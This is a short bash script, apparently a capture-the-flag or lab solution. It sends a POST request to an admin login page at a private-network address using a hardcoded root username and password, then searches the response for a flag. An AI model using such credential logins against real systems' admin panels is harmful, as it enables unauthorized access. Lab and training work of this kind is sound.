#!/usr/bin/env bash

ROOT_URL=${1:-http://10.13.248.102}
URL="${ROOT_URL}/admin/#"
PASS="qwerty123%40" # %40 is url-encoded '@'
curl -s -X POST --data-raw "username=root&password=$PASS&Login=Login" "${URL}" 2>/dev/null | grep --color=auto "flag"
